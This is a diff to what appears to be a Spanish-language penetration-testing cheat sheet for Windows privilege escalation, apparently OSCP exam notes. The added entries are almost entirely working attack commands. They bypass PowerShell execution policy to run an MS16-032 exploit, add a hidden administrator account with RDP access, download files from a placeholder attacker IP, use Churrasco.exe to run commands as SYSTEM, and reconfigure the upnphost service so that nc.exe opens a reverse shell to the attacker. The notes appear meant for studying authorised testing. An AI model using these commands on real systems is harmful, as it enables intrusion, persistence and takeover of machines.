@@ -92,5 +92,58 @@ gcc 14814.c -o can
 
 # Elevacion de privilegios WINDOWS
 
+## Reconocimiento automatico
+
+30) Windows Exploit Sugester
+<pre>
+cp $OSCP/escalacion/windows-exploit-suggester.py wes.py
+python wes.py -d 2017-05-27-mssb.xls -i systeminfo.txt
+</pre>
+
 ## Utilidades
-20) Ejemplo escapado de caracteres en Windows --> `echo net user rady rady /add 1^> "C:\Documents and Settings\Backup\net4.log" 2^>^&1 > backup-python.cmd`
+
+31) Ejecución de script en powershell sin tener que abrir una shell de powershell
+<pre>
+powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+</pre>
+
+32) Añadir usuario administrador y con acceso remoto (RDP):
+<pre>
+net user /add <USERNAME> <PASSWORD>
+net localgroup administrators <USERNAME> /add
+NET LOCALGROUP "Remote Desktop Users" <USERNAME> /ADD
+</pre>
+
+33) Descargar ficheros con powershell
+<pre>
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://IP_ATACANTE:PUERTO/FICHERO','C:\Users\Public\FICHERO')"
+</pre>
+
+## Exploits satisfactorios
+
+34) Windows Server 2003 and IIS 6.0 (Churrasco)
+<pre>
+Uso: Churrasco.exe -d "CMD COMO ADMIN"
+
+Ejemplo (crear un usuario administrador para acceder mediante RDP):
+Churrasco.exe -d "net user /add <USERNAME> <PASSWORD>"
+Churrasco.exe -d "net localgroup administrators <USERNAME> /add"
+Churrasco.exe -d "NET LOCALGROUP "Remote Desktop Users" <USERNAME> /ADD"
+</pre>
+  
+35) Windows XP SP1 (upnphost)
+<pre>
+En primer lugar, es necesario subir el fichero nc.exe a la máquina mediante FTP por ejemplo
+
+Ponemos a la escucha nuestra máquina: nc -nvlp <PUERTO>
+sc config upnphost binpath= "C:\Inetpub\nc.exe <IP ATACANTE> <PUERTO> -e C:\WINDOWS\System32\cmd.exe" 
+sc config upnphost obj= ".\LocalSystem" password= "" 
+sc qc upnphost
+If it fails because of a missing dependency, run the following:
+sc config SSDPSRV start= auto 
+net start SSDPSRV
+net start upnphost
+</pre>
+
+## Utilidades
+36) Ejemplo escapado de caracteres en Windows --> `echo net user rady rady /add 1^> "C:\Documents and Settings\Backup\net4.log" 2^>^&1 > backup-python.cmd`
